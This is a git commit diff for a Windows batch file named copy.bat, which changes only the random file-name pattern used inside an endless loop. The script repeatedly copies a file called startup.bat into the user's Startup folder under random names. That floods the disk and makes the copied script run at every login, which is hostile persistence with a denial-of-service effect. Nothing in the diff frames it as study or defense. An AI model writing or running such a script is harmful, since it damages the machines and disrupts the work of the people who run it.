0ae4a9d62dae30dea23873baa3d9f8c63614211e
AXL.Alixx <58485851+axlalixx@users.noreply.github.com>
2024-12-20 01:46:31 +0000

    Update copy.bat

--- copy.bat
+++ copy.bat
@@ -1,4 +1,4 @@
 @echo off
 :loop
-copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\d%random%.bat
+copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\d%random%d.bat
 goto loop
